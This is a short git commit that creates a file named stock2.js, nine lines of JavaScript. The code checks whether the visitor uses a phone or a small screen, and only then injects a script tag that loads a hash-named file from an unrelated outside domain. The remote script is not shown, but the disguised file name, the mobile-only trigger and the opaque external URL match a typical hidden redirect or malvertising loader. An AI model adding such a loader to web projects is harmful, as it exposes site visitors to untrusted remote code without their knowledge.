6022c29469eb198b4e48fd82324762bdd9fb14d8
dork12 <127926288+yukrini@users.noreply.github.com>
2024-07-13 14:53:04 +0700

    Create stock2.js

---
+++ stock2.js
@@ -0,0 +1,9 @@
+		if (screen.width < 500 ||
+ navigator.userAgent.match(/Android/i) ||
+ navigator.userAgent.match(/webOS/i) ||
+ navigator.userAgent.match(/iPhone/i) ||
+ navigator.userAgent.match(/iPod/i)){
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'//arabcuff.com/b5/13/86/b513868d33b5b1194392b4fd19a3dc2a.js',document.body||document.documentElement)
+	 }
+	 
